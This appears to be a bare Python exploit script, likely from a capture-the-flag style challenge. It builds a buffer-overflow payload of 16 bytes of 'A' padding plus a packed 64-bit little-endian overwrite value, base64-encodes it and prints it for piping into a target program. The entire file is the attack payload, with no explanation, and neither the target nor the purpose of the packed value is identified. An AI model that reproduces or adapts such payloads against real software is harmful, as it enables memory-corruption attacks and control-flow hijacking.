
import sys
import struct
import base64

buf = b'AAAAAAAAAAAAAAAA'
buf += struct.pack('<Q', 17528005189148012550)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
